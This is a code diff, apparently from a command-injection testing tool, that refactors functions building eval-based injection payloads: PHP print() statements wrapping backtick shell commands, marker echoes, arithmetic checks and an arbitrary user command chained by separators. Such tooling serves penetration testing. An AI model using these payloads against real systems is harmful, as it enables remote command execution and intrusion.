@@ -45,32 +45,11 @@ def decision(separator, TAG, randv1, randv2):
     payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
 
   else:
-    if settings.SKIP_CALC:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
-    else:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
+    commands = ["echo " + TAG]
+    if not settings.SKIP_CALC:
+      commands.append("echo $((" + str(randv1) + "%2B" + str(randv2) + "))")
+    commands = commands + ["echo " + TAG, "echo " + TAG]
+    payload = _print_statement(separator, commands)
 
   return payload
 
@@ -88,32 +67,12 @@ def decision_alter_interpreter(separator, TAG, randv1, randv2):
 
   else:
     python_payload = settings.LINUX_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + ")))\""
-    if settings.SKIP_CALC:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
-    else:
-      if separator == "":
-        payload = ("print(`echo " + TAG + "`." +
-                    "` " + python_payload + "`." +
-                    "`echo " + TAG + "`." +
-                    "`echo " + TAG + "`)" +
-                    separator
-                  )
-      else:
-        payload = ("print(`echo " + TAG +
-                    separator +python_payload  +
-                    separator + "echo " + TAG +
-                    separator + "echo " + TAG + "`)%3B"
-                  )
+    commands = ["echo " + TAG]
+    if not settings.SKIP_CALC:
+      # A leading space where nothing separates it from the marker before it.
+      commands.append((settings.SINGLE_WHITESPACE if separator == "" else "") + python_payload)
+    commands = commands + ["echo " + TAG, "echo " + TAG]
+    payload = _print_statement(separator, commands)
 
   return payload
 
@@ -127,20 +86,9 @@ def cmd_execution(separator, TAG, cmd):
     payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
   else:
     settings.USER_APPLIED_CMD = cmd
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "`echo " + TAG + "`." +
-                  "`" + cmd + "`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)"
-                )
-    else:
-      payload = ("print(`echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'" +
-                  separator + cmd  +
-                  separator + "echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'`)%3B"
-                )
+    # Quoted where a separator chains it, so the marker cannot be read as part of the command.
+    marker = "echo " + (TAG if separator == "" else "'" + TAG + "'")
+    payload = _print_statement(separator, [marker, marker, cmd, marker, marker])
 
   return payload
 
@@ -157,21 +105,7 @@ def cmd_execution_alter_interpreter(separator, TAG, cmd):
       commands = ["echo " + TAG, "echo " + TAG, python_payload, "echo " + TAG, "echo " + TAG]
       payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
   else:
-    settings.USER_APPLIED_CMD = cmd
-    if separator == "":
-      payload = ("print(`echo " + TAG + "`." +
-                  "`echo " + TAG + "`." +
-                  "`" + cmd + "`." +
-                  "`echo " + TAG + "`." +
-                  "`echo " + TAG + "`)"
-                )
-    else:
-      payload = ("print(`echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'" +
-                  separator +cmd  +
-                  separator + "echo '" + TAG + "'" +
-                  separator + "echo '" + TAG + "'`)%3B"
-                )
+    return cmd_execution(separator, TAG, cmd)
   return payload
 
 # eof
